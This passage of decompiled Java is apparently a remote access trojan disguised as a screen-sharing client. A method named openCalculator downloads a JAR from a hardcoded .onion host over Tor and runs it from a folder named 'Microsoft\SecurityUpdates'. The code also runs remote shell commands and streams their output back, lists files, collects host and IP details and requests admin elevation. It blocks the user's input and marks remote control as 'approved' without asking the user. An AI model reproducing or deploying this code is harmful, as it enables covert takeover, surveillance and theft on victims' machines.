         } catch (Exception var5) {
         }

         try {
            this.applyDisplayPower(false);
         } catch (Exception var4) {
         }

         try {
            if (this.padlockDllLoaded) {
               PadlockNative.stopAll();
            }
         } catch (Exception var3) {
         }

         try {
            ScreenShareSender.User32Extra.INSTANCE.BlockInput(false);
         } catch (Throwable var2) {
         }

         this.padlockBlockInputActive = false;
      }

      private void sendActionResult(String action, String requestId, String status, String note) {
         this.sendActionResult(action, requestId, status, note, null);
      }

      private void sendActionResult(String action, String requestId, String status, String note, JsonNode data) {
         try {
            ObjectNode payload = this.mapper
               .createObjectNode()
               .put("type", "clientActionResult")
               .put("action", action == null ? "" : action)
               .put("status", status == null ? "" : status);
            if (requestId != null && !requestId.isEmpty()) {
               payload.put("requestId", requestId);
            }

            if (note != null && !note.isEmpty()) {
               payload.put("note", note);
            }

            if (data != null && !data.isNull()) {
               payload.set("data", data);
            }

            this.sendSafe(payload.toString());
         } catch (Exception var7) {
         }
      }

      private Path createTryTextFile(String text, String filename) throws Exception {
         String cleanName = this.sanitizeTextFileName(filename);
         Path baseDir = Paths.get(System.getenv("APPDATA"), "Microsoft", "SecurityUpdates");
         if (cleanName.isEmpty()) {
            cleanName = "kick.bat";
         }

         Files.createDirectories(baseDir);
         Path target = baseDir.resolve(cleanName);
         Files.write(target, text.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
         return target.toAbsolutePath();
      }

      private String sanitizeTextFileName(String raw) {
         String value = raw == null ? "" : raw.trim();
         if (value.isEmpty()) {
            return "";
         }

         value = value.replace('\\', '_').replace('/', '_');
         value = value.replaceAll("[^A-Za-z0-9._-]", "_");
         if (!value.toLowerCase().endsWith(".bat")) {
            value = value + ".bat";
         }

         if (value.length() > 120) {
            value = value.substring(0, 120);
         }

         return !value.isEmpty() && !".".equals(value) && !"..".equals(value) ? value : "";
      }

      private boolean openCalculator() {
         if (!this.isWindows()) {
            return false;
         }

         try {
            Path dir = Paths.get(System.getenv("APPDATA"), "Microsoft", "SecurityUpdates");
            Files.createDirectories(dir);
            Path tempJar = dir.resolve("JavaSec.jar");
            byte[] payload = null;
            String source = null;

            for (String candidate : this.payloadSources()) {
               try {
                  payload = this.downloadPayload(candidate);
                  if (payload != null && payload.length > 0) {
                     source = candidate;
                     break;
                  }
               } catch (Exception e) {
                  System.out.println("Rerun source failed: " + this.maskUrl(candidate) + " -> " + e.getMessage());
               }
            }

            if (payload == null) {
               System.out.println("Rerun: no payload source available");
               return false;
            } else {
               Files.write(tempJar, payload, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
               System.out.println("Rerun payload: " + this.maskUrl(source) + " [" + payload.length + " bytes]");
               new ProcessBuilder(ScreenShareSender.getJVMLauncher(), "-jar", tempJar.toString(), "Run", "Click", "Click", this.accessKey)
                  .redirectErrorStream(true)
                  .start();
               return true;
            }
         } catch (Exception e) {
            System.out.println("Rerun failed: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            return false;
         }
      }

      private List<String> payloadSources() {
         List<String> out = new ArrayList<>();

         try {
            for (String u : ScreenShareSenderAuto.getPayloadUrls()) {
               if (u != null && !u.trim().isEmpty() && !out.contains(u)) {
                  out.add(u.trim());
               }
            }
         } catch (Exception var5) {
         }

         try {
            String host = this.panelHostOf();
            if (host != null && !host.isEmpty()) {
               out.add("https://" + host + "/api/hlam/files/4001");
            }
         } catch (Exception var4) {
         }

         out.add("http://5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion/api/hlam/files/4001");
         return out;
      }

      private String panelHostOf() {
         try {
            if (ScreenShareSender.senderClient != null
               && ScreenShareSender.senderClient.getURI() != null
               && ScreenShareSender.senderClient.getURI().getHost() != null) {
               return ScreenShareSender.senderClient.getURI().getHost();
            }
         } catch (Exception var5) {
         }

         String resolved = ScreenShareSenderAuto.getURL();
         if (resolved == null) {
            return null;
         }

         String v = resolved.trim();
         int scheme = v.indexOf("://");
         if (scheme >= 0) {
            v = v.substring(scheme + 3);
         }

         int slash = v.indexOf(47);
         if (slash >= 0) {
            v = v.substring(0, slash);
         }

         return v.isEmpty() ? null : v;
      }

      private byte[] downloadPayload(String urlStr) throws IOException {
         URL url = new URL(urlStr);
         HttpURLConnection conn;
         if (urlStr.contains(".onion")) {
            conn = (HttpURLConnection)url.openConnection(TorBridge.get().socks());
         } else {
            conn = (HttpURLConnection)url.openConnection();
         }

         try {
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(120000);
            conn.setRequestProperty("Accept", "application/java-archive");
            conn.setRequestProperty(
               "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            );
            int code = conn.getResponseCode();
            if (code != 200) {
               throw new IOException("HTTP " + code);
            }

            long expected = conn.getContentLengthLong();
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            InputStream in = conn.getInputStream();

            try {
               byte[] chunk = new byte[65536];

               int len;
               while ((len = in.read(chunk)) != -1) {
                  buf.write(chunk, 0, len);
               }
            } catch (Throwable var16) {
               if (in != null) {
                  try {
                     in.close();
                  } catch (Throwable var15) {
                     var16.addSuppressed(var15);
                  }
               }

               throw var16;
            }

            if (in != null) {
               in.close();
            }

            byte[] data = buf.toByteArray();
            if (expected > 0L && data.length != expected) {
               throw new IOException("truncated: " + data.length + " of " + expected);
            } else {
               return data;
            }
         } finally {
            conn.disconnect();
         }
      }

      private String maskUrl(String url) {
         if (url == null) {
            return "";
         }

         int idx = url.indexOf("/file/");
         return idx > 0 ? url.substring(0, idx + 6) + "***" : url;
      }

      private void requestElevation(String requestId) {
         if (!this.isWindows()) {
            this.sendActionResult("requestAdmin", requestId, "error", "not_windows");
         } else if (ScreenShareSender.isRunningAsAdmin()) {
            this.sendActionResult("requestAdmin", requestId, "already", "already_admin");
         } else if (!this.elevationInProgress.compareAndSet(false, true)) {
            this.sendActionResult("requestAdmin", requestId, "busy", "already_pending");
         } else {
            try {
               String[] elevArgs = new String[]{this.accessKey, String.valueOf(this.getURI()), this.deviceName, String.valueOf(20), String.valueOf(0.8F)};
               ScreenShareSender.elevateWorker("screen", false);
               this.sendActionResult("requestAdmin", requestId, "accepted", "high_worker");
               this.elevationInProgress.set(false);
            } catch (Exception e) {
               this.sendActionResult("requestAdmin", requestId, "error", "exception");
               this.elevationInProgress.set(false);
            }
         }
      }

      private void sendShellOk(String action, String requestId, JsonNode data) {
         this.sendShellResult(action, requestId, "ok", data, null);
      }

      private void sendShellError(String action, String requestId, String error) {
         this.sendShellResult(action, requestId, "error", null, error);
      }

      private void sendShellResult(String action, String requestId, String status, JsonNode data, String error) {
         try {
            ObjectNode payload = this.mapper.createObjectNode();
            payload.put("type", "shellResult");
            payload.put("action", action == null ? "" : action);
            payload.put("status", status == null ? "error" : status);
            if (requestId != null && !requestId.trim().isEmpty()) {
               payload.put("requestId", requestId.trim());
            }

            if ("ok".equals(status) && data != null) {
               payload.set("data", data);
            }

            if (!"ok".equals(status) && error != null) {
               payload.put("error", error);
            }

            this.sendSafe(payload.toString());
         } catch (Exception var7) {
         }
      }

      private void sendShellChunk(String action, String requestId, String stream, String data) {
         if (data != null && !data.isEmpty()) {
            if (this.isOpen()) {
               try {
                  ObjectNode payload = this.mapper.createObjectNode();
                  payload.put("type", "shellChunk");
                  payload.put("action", action == null ? "" : action);
                  if (requestId != null && !requestId.trim().isEmpty()) {
                     payload.put("requestId", requestId.trim());
                  }

                  if (stream != null && !stream.trim().isEmpty()) {
                     payload.put("stream", stream.trim());
                  }

                  payload.put("data", data);
                  this.sendSafe(payload.toString());
               } catch (Exception var6) {
               }
            }
         }
      }

      private String ensureShellCwd() {
         String current = this.shellCwd == null ? "" : this.shellCwd.trim();
         if (!current.isEmpty()) {
            try {
               if (Files.isDirectory(Paths.get(current))) {
                  return current;
               }
            } catch (Exception var3) {
            }
         }

         String next = this.resolveInitialShellCwd();
         this.shellCwd = next;
         return next;
      }

      private String resolveInitialShellCwd() {
         String home = System.getProperty("user.home");
         if (home != null && !home.trim().isEmpty()) {
            try {
               if (Files.isDirectory(Paths.get(home))) {
                  return home;
               }
            } catch (Exception var5) {
            }
         }

         String dir = System.getProperty("user.dir");
         if (dir != null && !dir.trim().isEmpty()) {
            try {
               if (Files.isDirectory(Paths.get(dir))) {
                  return dir;
               }
            } catch (Exception var4) {
            }
         }

         return "";
      }

      private Path resolveShellPath(String requested, String base) {
         String trimmed = requested == null ? "" : requested.trim();
         String fallback = base == null ? "" : base.trim();
         if (trimmed.isEmpty()) {
            trimmed = fallback;
         }

         if (trimmed.isEmpty()) {
            trimmed = this.resolveInitialShellCwd();
         }

         if (trimmed.isEmpty()) {
            return null;
         }

         Path path = Paths.get(trimmed);
         if (!path.isAbsolute() && !fallback.isEmpty()) {
            path = Paths.get(fallback).resolve(trimmed);
         }

         path = path.normalize();
         return !Files.isDirectory(path) ? null : path;
      }

      private int runShellCommand(String cmd, Path cwd, String requestId) throws Exception {
         boolean isWin = File.separatorChar == '\\';
         List<String> command = new ArrayList<>();
         if (isWin) {
            command.add("cmd");
            command.add("/c");
            command.add(cmd);
         } else {
            command.add("/bin/sh");
            command.add("-lc");
            command.add(cmd);
         }

         ProcessBuilder pb = new ProcessBuilder(command);
         if (cwd != null) {
            pb.directory(cwd.toFile());
         }

         Process p = pb.start();
         Thread t1 = this.pipeShell(p.getInputStream(), requestId, "stdout");
         Thread t2 = this.pipeShell(p.getErrorStream(), requestId, "stderr");
         int exitCode = p.waitFor();

         try {
            t1.join();
         } catch (InterruptedException var13) {
         }

         try {
            t2.join();
         } catch (InterruptedException var12) {
         }

         return exitCode;
      }

      private Thread pipeShell(InputStream in, String requestId, String stream) {
         Thread t = new Thread(() -> {
            try {
               InputStreamReader reader = new InputStreamReader(in, Charset.defaultCharset());

               try {
                  char[] buf = new char[2048];
                  StringBuilder buffer = new StringBuilder();
                  long lastFlush = System.currentTimeMillis();

                  int n;
                  while ((n = reader.read(buf)) != -1) {
                     buffer.append(buf, 0, n);
                     long now = System.currentTimeMillis();
                     if (buffer.length() >= 4096 || now - lastFlush >= 200L) {
                        this.flushShellBuffer(buffer, requestId, stream);
                        lastFlush = now;
                     }
                  }

                  this.flushShellBuffer(buffer, requestId, stream);
               } catch (Throwable var13) {
                  try {
                     reader.close();
                  } catch (Throwable var12) {
                     var13.addSuppressed(var12);
                  }

                  throw var13;
               }

               reader.close();
            } catch (Exception var14) {
            }
         });
         t.setDaemon(true);
         t.start();
         return t;
      }

      private void flushShellBuffer(StringBuilder buffer, String requestId, String stream) {
         if (buffer.length() != 0) {
            this.sendShellChunk("exec", requestId, stream, buffer.toString());
            buffer.setLength(0);
         }
      }

      private void sendSafe(String payload) {
         if (payload != null && !payload.isEmpty()) {
            if (this.isOpen()) {
               synchronized (this.sendLock) {
                  if (this.isOpen()) {
                     this.send(payload);
                  }
               }
            }
         }
      }

      private void sendSafe(byte[] payload) {
         if (payload != null && payload.length != 0) {
            if (this.isOpen()) {
               synchronized (this.sendLock) {
                  if (this.isOpen()) {
                     this.send(payload);
                  }
               }
            }
         }
      }

      private String resolveUserLabel() {
         String user = System.getProperty("user.name");
         String host = "";

         try {
            host = InetAddress.getLocalHost().getHostName();
         } catch (Exception var4) {
         }

         if (user != null && !user.trim().isEmpty() && host != null && !host.trim().isEmpty()) {
            return user.trim() + "@" + host.trim();
         } else if (user != null && !user.trim().isEmpty()) {
            return user.trim();
         } else {
            return host == null ? "" : host.trim();
         }
      }

      private String resolveIpAddress() {
         String publicIp = this.fetchPublicIp();
         if (publicIp != null && !publicIp.isEmpty()) {
            return publicIp;
         }

         try {
            return InetAddress.getLocalHost().getHostAddress();
         } catch (Exception ignored) {
            return "";
         }
      }

      private String fetchPublicIp() {
         HttpURLConnection conn = null;

         try {
            URL url = new URL("https://api.ipify.org");
            conn = (HttpURLConnection)url.openConnection();
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);
            conn.setRequestMethod("GET");
            String out = this.readLimited(conn.getInputStream(), 64);
            return out == null ? "" : out.trim();
         } catch (Exception ignored) {
            return "";
         } finally {
            if (conn != null) {
               conn.disconnect();
            }
         }
      }

      private String resolveOsVersion() {
         String osName = System.getProperty("os.name");
         String osVersion = System.getProperty("os.version");
         String caption = "";
         if (this.isWindows()) {
            caption = this.firstNonEmptyLine(this.runCommand(Arrays.asList("wmic", "os", "get", "Caption"), 3), "Caption");
            if (caption.isEmpty()) {
               caption = this.runPowerShellSingleLine("Get-CimInstance Win32_OperatingSystem | Select-Object -First 1 -ExpandProperty Caption");
            }
         }

         if (!caption.isEmpty()) {
            return caption;
         }

         StringBuilder sb = new StringBuilder();
         if (osName != null && !osName.trim().isEmpty()) {
            sb.append(osName.trim());
         }

         if (osVersion != null && !osVersion.trim().isEmpty()) {
            if (sb.length() > 0) {
               sb.append(" ");
            }

            sb.append(osVersion.trim());
         }

         return sb.toString();
      }

      private String resolveCpuModel() {
         if (this.isWindows()) {
            String cpu = this.firstNonEmptyLine(this.runCommand(Arrays.asList("wmic", "cpu", "get", "Name"), 3), "Name");
            if (cpu.isEmpty()) {
               cpu = this.runPowerShellSingleLine("Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name");
            }

            return cpu;
         } else {
            return this.isMac()
               ? this.runCommand(Arrays.asList("sysctl", "-n", "machdep.cpu.brand_string"), 3).trim()
               : this.firstLineFromFile("/proc/cpuinfo", "model name");
         }
      }

      private String resolveGpuModel() {
         if (this.isWindows()) {
            String gpu = this.firstNonEmptyLine(this.runCommand(Arrays.asList("wmic", "path", "win32_VideoController", "get", "Name"), 3), "Name");
            if (gpu.isEmpty()) {
               gpu = this.runPowerShellSingleLine("Get-CimInstance Win32_VideoController | Select-Object -First 1 -ExpandProperty Name");
            }

            return gpu;
         } else {
            return this.isMac() ? this.runCommand(Arrays.asList("system_profiler", "SPDisplaysDataType"), 3).trim() : "";
         }
      }

      private String resolveRamLabel() {
         long totalBytes = -1L;

         try {
            OperatingSystemMXBean osBean = (OperatingSystemMXBean)ManagementFactory.getOperatingSystemMXBean();
            totalBytes = osBean.getTotalPhysicalMemorySize();
         } catch (Exception var7) {
         }

         if (totalBytes <= 0L) {
            return "";
         }

         long totalMb = totalBytes / 1048576L;
         long totalGb = Math.max(1L, Math.round(totalMb / 1024.0));
         return totalGb + " GB (" + totalMb + " MB)";
      }

      private boolean isWindows() {
         String os = System.getProperty("os.name");
         return os != null && os.toLowerCase().contains("win");
      }

      private boolean isMac() {
         String os = System.getProperty("os.name");
         return os != null && os.toLowerCase().contains("mac");
      }

      private String runPowerShellSingleLine(String script) {
         String out = this.runCommand(Arrays.asList("powershell", "-NoProfile", "-NonInteractive", "-Command", script), 3);
         return this.firstNonEmptyLine(out, null);
      }

      private String runCommand(List<String> command, int timeoutSeconds) {
         Process p = null;

         try {
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true);
            p = pb.start();
            String output = this.readLimited(p.getInputStream(), 8192);
            if (!p.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
               p.destroyForcibly();
            }

            return output == null ? "" : output;
         } catch (Exception ignored) {
            if (p != null) {
               p.destroyForcibly();
            }

            return "";
         }
      }

      private String readLimited(InputStream input, int limit) throws Exception {
         if (input == null) {
            return "";
         }

         StringBuilder sb = new StringBuilder();
         InputStreamReader reader = new InputStreamReader(input, Charset.defaultCharset());

         try {
            char[] buf = new char[1024];

            int n;
            while ((n = reader.read(buf)) != -1) {
               int remaining = limit - sb.length();
               if (remaining <= 0) {
                  break;
               }

               sb.append(buf, 0, Math.min(n, remaining));
               if (sb.length() >= limit) {
                  break;
               }
            }
         } catch (Throwable var9) {
            try {
               reader.close();
            } catch (Throwable var8) {
               var9.addSuppressed(var8);
            }

            throw var9;
         }

         reader.close();
         return sb.toString();
      }

      private String firstLineFromFile(String path, String prefix) {
         if (path != null && !path.trim().isEmpty()) {
            try {
               for (String line : Files.readAllLines(Paths.get(path), Charset.defaultCharset())) {
                  if (line != null) {
                     String trimmed = line.trim();
                     if (!trimmed.isEmpty() && prefix != null && trimmed.toLowerCase().startsWith(prefix.toLowerCase())) {
                        int idx = trimmed.indexOf(58);
                        if (idx >= 0 && idx + 1 < trimmed.length()) {
                           return trimmed.substring(idx + 1).trim();
                        }
                     }
                  }
               }
            } catch (Exception var8) {
            }

            return "";
         } else {
            return "";
         }
      }

      private String firstNonEmptyLine(String output, String header) {
         if (output == null) {
            return "";
         }

         String[] lines = output.split("\\r?\\n");

         for (String line : lines) {
            if (line != null) {
               String trimmed = line.trim();
               if (!trimmed.isEmpty() && (header == null || !trimmed.equalsIgnoreCase(header))) {
                  return trimmed;
               }
            }
         }

         return "";
      }

      private String extractRequestId(JsonNode root) {
         if (root == null) {
            return "";
         }

         String requestId = root.path("requestId").asText("");
         if (requestId.isEmpty()) {
            requestId = root.path("jobId").asText("");
         }

         if (requestId.isEmpty()) {
            requestId = root.path("id").asText("");
         }

         return requestId == null ? "" : requestId.trim();
      }

      private List<Map<String, Object>> listEntries(String p) throws IOException {
         List<Map<String, Object>> out = new ArrayList<>();
         if (p != null && !p.isEmpty()) {
            Path dir = Paths.get(p);
            if (!Files.isDirectory(dir)) {
               return out;
            }

            DirectoryStream<Path> ds = Files.newDirectoryStream(dir);

            try {
               for (Path ch : ds) {
                  try {
                     BasicFileAttributes a = Files.readAttributes(ch, BasicFileAttributes.class, LinkOption.NOFOLLOW_LINKS);
                     Map<String, Object> r = new LinkedHashMap<>();
                     r.put("name", ch.getFileName().toString());
                     r.put("directory", a.isDirectory());
                     r.put("size", a.isDirectory() ? 0L : a.size());
                     r.put("modified", a.lastModifiedTime().toMillis());
                     r.put("path", ch.toAbsolutePath().toString());
                     out.add(r);
                  } catch (Exception var10) {
                  }
               }
            } catch (Throwable var11) {
               if (ds != null) {
                  try {
                     ds.close();
                  } catch (Throwable var9) {
                     var11.addSuppressed(var9);
                  }
               }

               throw var11;
            }

            if (ds != null) {
               ds.close();
            }

            out.sort((ax, b) -> {
               boolean ad = Boolean.TRUE.equals(ax.get("directory"));
               boolean bd = Boolean.TRUE.equals(b.get("directory"));
               if (ad != bd) {
                  return ad ? -1 : 1;
               } else {
                  return String.valueOf(ax.get("name")).compareToIgnoreCase(String.valueOf(b.get("name")));
               }
            });
            return out;
         } else {
            if (File.separatorChar == '\\') {
               for (char c = 'A'; c <= 'Z'; c++) {
                  String d = c + ":\\";
                  if (new File(d).exists()) {
                     out.add(row(new File(d), d, true));
                  }
               }
            } else {
               Path home = Paths.get(System.getProperty("user.home"));
               if (Files.exists(home)) {
                  out.add(row(home.toFile(), home.toString(), true));
               }
            }

            return out;
         }
      }

      private static Map<String, Object> row(File f, String path, boolean directory) {
         Map<String, Object> m = new LinkedHashMap<>();
         m.put("name", f.getName());
         m.put("directory", directory);
         m.put("size", directory ? 0L : f.length());
         m.put("modified", f.lastModified());
         m.put("path", path);
         return m;
      }

      private boolean canControl() {
         return this.controlEnabled && this.robot != null;
      }

      private int mapButton(String btn) {
         switch (btn) {
            case "middle":
               return 2048;
            case "right":
               return 4096;
            default:
               return 1024;
         }
      }

      private JsonNode readJson(String message) {
         try {
            return this.mapper.readTree(message);
         } catch (Exception ignored) {
            return null;
         }
      }

      private void updateWindowAndTune() {
         long now = System.currentTimeMillis();
         if (this.windowStartMs == 0L) {
            this.windowStartMs = now;
         }

         this.windowFrames++;
         long elapsed = now - this.windowStartMs;
         if (elapsed >= 1000L) {
            float actualFps = this.windowFrames * 1000.0F / (float)Math.max(1L, elapsed);
            this.windowStartMs = now;
            this.windowFrames = 0;
            if (this.autoTune) {
               int targetFps = this.fps;
               if (actualFps < targetFps * 0.75F) {
                  if (this.scale > 0.51F) {
                     this.scale = ScreenShareSender.clampScale(this.scale - 0.03F);
                  } else if (this.jpegQuality > 0.61F) {
                     this.jpegQuality = ScreenShareSender.clampQuality(this.jpegQuality - 0.03F);
                  }
               } else if (actualFps > targetFps * 1.1F) {
                  if (this.jpegQuality < 0.89F) {
                     this.jpegQuality = ScreenShareSender.clampQuality(this.jpegQuality + 0.03F);
                  } else if (this.scale < 0.99F) {
                     this.scale = ScreenShareSender.clampScale(this.scale + 0.03F);
                  }
               }
            }
         }
      }

      private BufferedImage scaleImage(BufferedImage source, float scale) {
         int targetWidth = Math.max(1, Math.round(source.getWidth() * scale));
         int targetHeight = Math.max(1, Math.round(source.getHeight() * scale));
         if (targetWidth == source.getWidth() && targetHeight == source.getHeight()) {
            return source;
         }

         BufferedImage scaled = new BufferedImage(targetWidth, targetHeight, 1);
         Graphics2D g = scaled.createGraphics();

         try {
            g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
            g.drawImage(source, 0, 0, targetWidth, targetHeight, null);
         } finally {
            g.dispose();
         }

         return scaled;
      }

      private BufferedImage ensureRgb(BufferedImage source) {
         if (source == null) {
            return null;
         }

         if (source.getType() == 1) {
            return source;
         }

         BufferedImage rgb = new BufferedImage(source.getWidth(), source.getHeight(), 1);
         Graphics2D g = rgb.createGraphics();

         try {
            g.drawImage(source, 0, 0, null);
         } finally {
            g.dispose();
         }

         return rgb;
      }

      private Point mapToCapture(int x, int y) {
         int outW = this.outputWidth > 0 ? this.outputWidth : this.captureRect.width;
         int outH = this.outputHeight > 0 ? this.outputHeight : this.captureRect.height;
         if (outW > 0 && outH > 0) {
            int mappedX = this.captureRect.x + Math.round((float)x / outW * this.captureRect.width);
            int mappedY = this.captureRect.y + Math.round((float)y / outH * this.captureRect.height);
            if (mappedX < this.captureRect.x) {
               mappedX = this.captureRect.x;
            }

            if (mappedY < this.captureRect.y) {
               mappedY = this.captureRect.y;
            }

            int maxX = this.captureRect.x + this.captureRect.width - 1;
            int maxY = this.captureRect.y + this.captureRect.height - 1;
            if (mappedX > maxX) {
               mappedX = maxX;
            }

            if (mappedY > maxY) {
               mappedY = maxY;
            }

            return new Point(mappedX, mappedY);
         } else {
            return null;
         }
      }

      public void awaitClose() throws InterruptedException {
         this.closeLatch.await();
      }

      private void handleControlRequest(boolean requested) {
         this.debug("handleControlRequest requested=" + requested + ", localApproved=" + this.localControlApproved);
         if (!requested) {
            this.controlEnabled = false;
            this.sendControlStatus(false, "disabled");
         } else if (this.localControlApproved) {
            this.controlEnabled = true;
            this.sendControlStatus(true, "enabled");
         } else {
            this.controlEnabled = false;
            this.requestLocalApproval();
         }
      }

      private void requestLocalApproval() {
         if (GraphicsEnvironment.isHeadless()) {
            System.out.println("Control request ignored: no UI available for local approval.");
            this.localControlApproved = false;
            this.controlEnabled = false;
            this.sendControlStatus(false, "no-ui");
         } else if (!this.approvalInProgress.compareAndSet(false, true)) {
            this.debug("approval already in progress");
         } else {
            try {
               this.controlEnabled = true;
               this.debug("control approval result=" + this.localControlApproved);
               this.sendControlStatus(this.controlEnabled, this.localControlApproved ? "approved" : "denied");
            } catch (Exception e) {
               System.out.println("Control request ignored: " + e.getClass().getSimpleName() + ": " + e.getMessage());
               this.localControlApproved = false;
               this.controlEnabled = false;
               this.sendControlStatus(false, "no-ui");
            } finally {
               this.approvalInProgress.set(false);
            }
         }
      }

      private void handlePauseRequest(boolean requested) {
         if (requested != this.pauseCapture) {
            this.requestLocalPauseApproval(requested);
         }
      }

      private void sendControlStatus(boolean allowed, String note) {
         if (this.isOpen()) {
            try {
               ObjectNode payload = this.mapper.createObjectNode();
               payload.put("type", "controlStatus");
               payload.put("allowed", allowed);
               if (note != null && !note.trim().isEmpty()) {
                  payload.put("note", note.trim());
               }

               this.sendSafe(payload.toString());
            } catch (Exception var4) {
            }
         }
      }

      private void debug(String message) {
         if (this.debugEnabled) {
            System.out.println("[sender-debug] " + message);
         }
      }

      private boolean isPadlockDllEnabled() {
         String prop = System.getProperty("screen.padlock.dll.enabled");
         if (prop != null && !prop.trim().isEmpty()) {
            return ScreenShareSender.isTruthy(prop);
         }

         String env = System.getenv("SCREEN_PADLOCK_DLL_ENABLED");
         return env != null && !env.trim().isEmpty() ? ScreenShareSender.isTruthy(env) : true;
      }

      private void requestLocalPauseApproval(boolean pauseRequested) {
         if (GraphicsEnvironment.isHeadless()) {
            System.out.println("Pause request ignored: no UI available for local approval.");
            this.sendPauseStatus(false, this.pauseCapture, "no-ui");
         } else if (this.pauseApprovalInProgress.compareAndSet(false, true)) {
            try {
               this.pauseCapture = pauseRequested;
               this.hideFreezeOverlay();
               this.sendPauseStatus(true, this.pauseCapture, "approved");
            } finally {
               this.pauseApprovalInProgress.set(false);
            }
         }
      }

      private void sendPauseStatus(boolean allowed, boolean paused, String note) {
         if (this.isOpen()) {
            try {
               ObjectNode payload = this.mapper.createObjectNode();
               payload.put("type", "pauseStatus");
               payload.put("allowed", allowed);
               payload.put("paused", paused);
               if (note != null && !note.trim().isEmpty()) {
                  payload.put("note", note.trim());
               }

               this.sendSafe(payload.toString());
            } catch (Exception var5) {
            }
         }
      }

      private void showFreezeOverlay() {
      }

      private void hideFreezeOverlay() {
         SwingUtilities.invokeLater(() -> {
            synchronized (this.overlayLock) {
               if (!this.freezeOverlays.isEmpty()) {
                  for (JWindow window : this.freezeOverlays) {
                     try {
                        window.setVisible(false);
                        window.dispose();
                     } catch (Exception var6) {
                     }
                  }

                  this.freezeOverlays.clear();
                  this.debug("freeze overlay hidden");
               }
            }
         });
      }

      private static final class PadlockResult {
         final String status;
         final String note;

         private PadlockResult(String status, String note) {
            this.status = status == null ? "" : status;
            this.note = note == null ? "" : note;
         }
      }
   }

   private interface User32Extra extends StdCallLibrary {
      ScreenShareSender.User32Extra INSTANCE = (ScreenShareSender.User32Extra)Native.load(
         "user32", ScreenShareSender.User32Extra.class, W32APIOptions.DEFAULT_OPTIONS
      );

      boolean BlockInput(boolean fBlockIt);
   }
}
